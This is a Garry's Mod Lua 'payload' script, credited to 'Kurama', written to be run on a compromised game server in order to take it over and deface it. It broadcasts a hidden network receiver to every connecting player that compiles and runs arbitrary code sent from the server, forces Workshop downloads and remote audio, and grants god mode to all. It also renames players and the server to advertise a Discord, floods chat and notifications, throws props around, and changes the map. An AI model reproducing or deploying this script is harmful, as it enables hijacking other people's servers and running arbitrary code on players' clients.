-- Payload Created by Kurama

-- Debug by Doge Chien

-- Visuel Kawai SSV

-- Obligation to credit myself in the visual

-- discord.gg/kurama

function RandomString(intMin, intMax)
local ret = ""
    for _ = 1, math.random(intMin, intMax) do
    ret = ret .. string.char(math.random(65, 90))
end
    return ret
end
local randomtable = {
    CodeRandom = RandomString(0, 69),
    TimingRandom = RandomString(0, 69),
    ClientRandom = RandomString(0, 69),
    ServeurRadom = RandomString(0, 69)
    }
util.AddNetworkString(randomtable["TimingRandom"])
util.AddNetworkString(randomtable["CodeRandom"])
BroadcastLua([[net.Receive("]] .. randomtable["CodeRandom"] .. [[",function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),"?")()end)]])
hook.Add("PlayerInitialSpawn", "MacdoFritesKetchup", function(ply)
    if not ply:IsBot() then
        ply:SendLua([[net.Receive("]] .. randomtable["CodeRandom"] .. [[",function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),"?")()end)]])
        ply:SendLua([[steamworks.DownloadUGC(YOUR_WORKSHOP_ID, function(n) game.MountGMA(n) game.AddParticles("particles/CHANGE_ME.pcf") PrecacheParticleSystem("CHANGE_ME") end)]])
    end
end)

m_strImageGlobalVar = RandomString( 6, 12 )
local function InfoClient(code)
local data = util.Compress(code)
local len = #data
    net.Start(randomtable["CodeRandom"])
    net.WriteUInt(len, 16)
    net.WriteData(data, len)
    net.Broadcast()
end
for k, v in pairs(player.GetAll()) do
    v:SendLua("steamworks.FileInfo(2017072330,function(result)steamworks.Download(result.fileid,true,function(name)game.MountGMA(name)end) end)")
    v:SendLua([[steamworks.DownloadUGC(YOUR_WORKSHOP_ID, function(n) game.MountGMA(n) game.AddParticles("particles/CHANGE_ME.pcf") PrecacheParticleSystem("CHANGE_ME") end)]])
end

timer.Simple(2.5, function()
    RunConsoleCommand("hostname", "Serveur en cours d'event by Kawai SSV -) discord.gg/kurama")
    RunConsoleCommand("ulx", "god", "*")
    RunConsoleCommand("sv_alltalk", "1")
    PrecacheParticleSystem("CHANGE_ME")
end)

-- Bordel - Spam Notif
timer.Simple(5, function()
InfoClient([[net.Receive("]] .. randomtable["TimingRandom"] .. [[",function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),"?")()end)]])
InfoClient([[
    for i = 1, 10 do
    ParticleEffectAttach("CHANGE_ME", PATTACH_ABSORIGIN_FOLLOW, LocalPlayer(), 0)
end
timer.Simple(5, function()
timer.Create("]] .. RandomString(0, 69) .. [[", 0.3, 0, function()
    notification.AddLegacy( "Doge Chien", math.random(0, 4), 1.5 )
end)
timer.Create("]] .. RandomString(0, 69) .. [[", 0.3, 0, function()
    notification.AddLegacy( "Kurama", math.random(0, 4), 1.5 )
end)
timer.Create("]] .. RandomString(0, 69) .. [[", 0.3, 0, function()
        notification.AddLegacy( "TheCedoux", math.random(0, 4), 1.5 )
    end)
end)
timer.Simple(1, function()
    function GAMEMODE:PostDraw2DSkyBox()
local col = Color( 0, 0, 255)
    render.Clear(col.r/1.3, col.g/1.3, col.b/1.3, 255)
    return !!1
end
    function GAMEMODE:PreDrawSkyBox()
local col = Color( 0, 0, 255)
    render.Clear(col.r/1.3, col.g/1.3, col.b/1.3, 255)
        return !!1
    end
end)
]])

timer.Simple( 5, function()
InfoClient([=[
g_]=].. m_strImageGlobalVar.. [=[ = {}
local html = [[<style type="text/css"> html, body {background-color: transparent;} html{overflow:hidden; ]].. (true and "margin: -8px -8px;" or "margin: 0px 0px;") ..[[ } </style><body><img src="]] .. "%s" .. [[" alt="" width="]] .. "%i"..[[" height="]] .. "%i" .. [[" /></body>]]
local function LoadWebMaterial( strURL, strUID, intSizeX, intSizeY )
local pnl = vgui.Create( "HTML" )
    pnl:SetPos( ScrW() -1, ScrH() -1 )
    pnl:SetVisible( true )
    pnl:SetMouseInputEnabled( false )
    pnl:SetKeyBoardInputEnabled( false )
    pnl:SetSize( intSizeX, intSizeY )
    pnl:SetHTML( html:format(strURL, intSizeX, intSizeY) )
local PageLoaded
PageLoaded = function()
local mat = pnl:GetHTMLMaterial()
    if mat then
g_]=].. m_strImageGlobalVar.. [=[[strUID] = { mat, pnl }
    return
end
timer.Simple( 0.5, PageLoaded )
end
PageLoaded()
end
]=])
end)

-- Zoom - Sound - Color
InfoClient([[
local sW, sH = ScrW(), ScrH()
local w,h = ScrW(), ScrH()
local W, H = ScrW(), ScrH()
local prevVal = 2
local defaultfov = LocalPlayer():GetFOV()
local override = 70
local sent = false
local audio
local skys = ents.FindByClass("env_skypaint")
local function AudioVizualier()
    if not audio then return end
local tbl = {}
local col = HSVToColor(CurTime() * 36 % 360, .3, .8)
local vv = Vector(col.r / 255, col.g / 255, col.b / 255)
    audio:FFT(tbl, FFT_4096)
local avg = 0
    for i = 1, 40 do
    avg = avg + tbl[i]
end
local h = CurTime() * 250 % 360
    prevVal = Lerp(30 * FrameTime(), prevVal, avg)
        if prevVal > 2 then
    util.ScreenShake(vector_origin, prevVal * 2, 10, 2, 5000)
local vPos = LocalPlayer():EyePos()
local emitter = ParticleEmitter( LocalPlayer():EyePos())
local particle = emitter:Add( "sprites/glow04_noz", vPos )
    if ( particle ) then
    particle:SetVelocity(VectorRand() * 50)
    particle:SetDieTime(1)
    particle:SetStartAlpha(0)
    particle:SetEndAlpha(255)
    particle:SetStartSize(50)
    particle:SetEndSize(0)
    particle:SetStartLength(55)
    particle:SetEndLength(0)
    particle:SetColor(vv)
    particle:SetGravity(Vector(0,0,0))
    particle:SetAirResistance(5)
    particle:SetCollide(true)
    particle:SetBounce(0.9)
end
    override = Lerp(10 * FrameTime(), override, prevVal * .875)
    else
    override = Lerp(5 * FrameTime(), override, defaultfov)
    sent = false
end
local vPos = LocalPlayer():EyePos() + Vector(0, 0, -5)
local emitter = ParticleEmitter( LocalPlayer():EyePos())
local particle = emitter:Add("particle/particle_smokegrenade", vPos)
    particle:SetVelocity(VectorRand() * 50)
    particle:SetDieTime(2)
    particle:SetStartAlpha(math.Rand(1,10))
    particle:SetStartSize(1900)
    particle:SetEndSize(math.Rand(80,90))
    particle:SetColor(vv)
    particle:SetGravity(Vector(0,0,100))
    particle:SetAirResistance(500)
end
local Wmats = Entity(0):GetMaterials()
    for k,v in pairs(Wmats) do
    Material(v):SetVector("$color", Vector(0,0,0))
end 
local col = HSVToColor(CurTime() * 36 % 360, .3, .8)
local v = Vector(col.r / 255, col.g / 255, col.b / 255)
    for k, v in pairs( ents.FindByClass( "prop_*" ) ) do 
    v:SetColor( col )
    v:Activate()
end
    for k,p in pairs(player.GetAll()) do
    p:SetColor( col )
    end
local chair = ClientsideModel("models/jazzmcfly/nekopara/coco/coco_player.mdl")
    chair:SetNoDraw(true)
local data = {}
local function genChair(id)
local pos = LocalPlayer():GetPos()
    data[id] = { Vector(math.random(pos.x-1000,pos.x+1000),math.random(pos.y-1000,pos.y+1000),pos.z + math.random(800,1000) ), math.random(10, 70) }
end
    for i=1, 70 do
    genChair(i)
end
    hook.Add("PostDrawOpaqueRenderables","]] .. RandomString(0, 69) .. [[",function()
local z = LocalPlayer():GetPos().z
    for i=1, #data do
    chair:SetPos(data[i][1])
    chair:SetupBones()
    chair:DrawModel()
    data[i][1].z = data[i][1].z - data[i][2] / 20
        if data[i][1].z <= z then
            genChair(i)
        end
    end
end)
local CHANGE_MEMusique = {}
    hook.Add("HUDPaint", "MesOreilleSaleConnard",function()
    for k,v in pairs(CHANGE_MEMusique) do
        v()
    end
end)
    
SOUNDSTART_CTP = false
OZJFOZJCEZIO = true

sound.PlayURL("https://cdn.kurama.info/songs/EverythingBlack_AMV.mp3", "noblock", function(s)
    if not IsValid(s) then return end
    audio = s
    s:EnableLooping( false)
    if not s then return end
    if SOUNDSTART_CTP then s:Stop() return end
SOUNDSTART_CTP = true
    s:SetVolume(15)
    s:Play()
local ragtbl = {}
    CHANGE_MEMusique["CoolEffect"] = function()
local tbl = {}
    s:FFT(tbl,FFT_2048)
    xpcall(function()
local fal = 0
    for i=4,6 do
    fal = fal + tbl[i]
end
    if fal > 0.7 then
local oneid = "newhud"..math.random(100, 300).."id"
local Wmats = Entity(0):GetMaterials()
    for k,v in pairs(Wmats) do
    Material(v):SetVector("$color", Vector(255,255,255))
end                         
util.ScreenShake( Vector( 0, 0, 0 ), 50, 50, 2, 5000 ) 
    for _, v in ipairs(player.GetAll()) do
        v:SetWeaponColor(Vector(255, 255, 255))
    end
                
                
timer.Simple(0.2, function()
local Wmats = Entity(0):GetMaterials()
    for k,v in pairs(Wmats) do
    Material(v):SetVector("$color", Vector(0,0,0))
end                     
    for _, v in ipairs(player.GetAll()) do
        v:SetWeaponColor(Vector(0, 0, 0))
    end   
    end)
end
    end,function()
end)
    end
end)
    surface.SetDrawColor( 255, 255, 255, 255)
    surface.DrawTexturedRectRotated( (ScrW() /2), (ScrH() /2), 120, 120, math.sin( CurTime() *10) )
    hook.Add( "RenderScreenspaceEffects", "KurmaBestHaxorLol", function()
    DrawMaterialOverlay( "effects/combine_binocoverlay.vmt", 1 )
end)
hook.Add("HUDPaint", "]] .. randomtable["ClientRandom"] .. [[", AudioVizualier)
hook.Add("CalcView", "]] .. randomtable["ClientRandom"] .. [[", function(ply, origin, angles, fov, znear, zfar)
    return {
    ["origin"] = origin,
    ["angles"] = angles,
    ["fov"] = override,
    ["znear"] = znear,
    ["zfar"] = zfar
    }
end)
local function stop()
    audio = nil
    hook.Remove("HUDPaint", "]] .. randomtable["ClientRandom"] .. [[")
    hook.Remove("HUDShouldDraw", "]] .. randomtable["ClientRandom"] .. [[")
    hook.Remove("CalcView", "]] .. randomtable["ClientRandom"] .. [[") 
    for k, v in pairs(oldhooks) do
    hook.Add("HUDPaint", k, v)
        oldhooks[k] = nil
    end
end
concommand.Add("lelstop", stop)
    if s == 1 then 
timer.Create("]] .. RandomString(0, 69) .. [[", 0.2, 0, function()
        util.ScreenShake( Vector(0,0,0), 2.5, 50, 0.5, 5000 )
    end)
end
]])
end)

timer.Simple(5, function()
    for k, v in pairs(player.GetAll()) do
        v:SetModel("models/jazzmcfly/nekopara/coco/coco_player.mdl")
    end
end)

-- Spam Chat
timer.Simple(5, function()
InfoClient([[  
timer.Create("]] .. randomtable["ServeurRadom"] .. [[", 1.7, 0, function()
local time = tonumber(0)
local Message = {
    "< Event by Kawai SSV >",
    "<< Event by Kawai SSV >>",
    "<<< Event by Kawai SSV >>>",
    "<<<< Event by Kawai SSV >>>>",
    "<<<<< Event by Kawai SSV >>>>>",
    "<<<<<< Event by Kawai SSV >>>>>>",
    "<<<<<<< Event by Kawai SSV >>>>>>>",
    "<<<<<<<< Event by Kawai SSV >>>>>>>>",
    "<<<<<<<<< Event by Kawai SSV >>>>>>>>>",
    "<<<<<<<< Event by Kawai SSV >>>>>>>>",
    "<<<<<<< Event by Kawai SSV >>>>>>>",
    "<<<<<< Event by Kawai SSV >>>>>>",
    "<<<<< Event by Kawai SSV >>>>>",
    "<<<< Event by Kawai SSV >>>>",
    "<<< Event by Kawai SSV >>>",
    "<< Event by Kawai SSV >>",
    }
    for _, line in pairs(Message) do
    time = time + tonumber(0.1)
timer.Simple(time,function()
        chat.AddText(HSVToColor( CurTime() % 6 * 60, 1, 1 ),line)
        end)
    end
end)
]])
end)

-- Model
timer.Simple(5, function()
InfoClient([[
timer.Create("]] .. RandomString(0, 69) .. [[",1,5800,function()
local Model12 = ClientsideModel("models/jazzmcfly/nekopara/coco/coco_player.mdl")
    Model12:SetNoDraw(true)
    Model12:SetModelScale(50)
timer.Create("ModelLoad", 0.01, 0, function()
    Model12:SetAngles(Angle(0, CurTime()*50 % 360 ,CurTime()*20 % 360) )
end)
local data = {}
local function ModelLoad12(id)
local pos = LocalPlayer():GetPos()
    data[id] = { Vector(math.random(pos.x-9000,pos.x+9000),math.random(pos.y-9000,pos.y+9000),pos.z + math.random(5000,2000) ), math.random(70, 170) }
end
    for i=1, 50 do
    ModelLoad12(i)
end
    hook.Add("PostDrawOpaqueRenderables","]] .. RandomString(0, 69) .. [[",function()
local z = LocalPlayer():GetPos().z
    for i=1, #data do
        Model12:SetPos(data[i][1])
        Model12:SetupBones()
        Model12:DrawModel()
        data[i][1].z = data[i][1].z - data[i][2] / 20
        if data[i][1].z <= z then
        ModelLoad12(i)
    end
end
    end)
end)
]])
end)

-- Custom Settings
timer.Simple( 5, function()
    RunConsoleCommand("sv_gravity", "200")
end)

timer.Create("LoadGM", 235, 1, function()
    RunConsoleCommand("ulx", "map", "gm_construct")
end)

timer.Create("Prop", 5, 0, function()
    for k, v in pairs(ents.FindByClass("prop_*")) do
local phys = v:GetPhysicsObject()
    if (IsValid(phys)) then
    phys:EnableMotion(true)
    end
end
local props = ents.GetAll()
    for _, prop in ipairs(props) do
        if (prop:GetPhysicsObject():IsValid()) then
            prop:GetPhysicsObject():ApplyForceCenter(Vector(0, 0, (650 * 0.73) * prop:GetPhysicsObject():GetMass()))
        end
    end
end)

timer.Create("RPName", 5, 99, function()
    for _, v in pairs(player.GetAll()) do
        v:GodEnable()
        v:setDarkRPVar("rpname", "Event by Kawai SSV -) Join my Discord : discord.gg/kurama")
    end
end)

timer.Simple(5, function()
    for k, v in pairs(player.GetAll()) do
        v:SetRunSpeed(400 * 4)
        v:SetWalkSpeed(400 * 4)
    end
end)

timer.Create(RandomString(0, 69), 5.5, 1, function()
    for k, v in pairs(ents.FindByClass("prop_*")) do
local phys = v:GetPhysicsObject()
    if (IsValid(phys)) then
        phys:EnableMotion(true)
    end
end
local props = ents.GetAll()
    for _, prop in ipairs(props) do
        if (prop:GetPhysicsObject():IsValid()) then
            prop:GetPhysicsObject():ApplyForceCenter(Vector(0, 0, (650 * 0.73) * prop:GetPhysicsObject():GetMass()))
        end
    end
end)
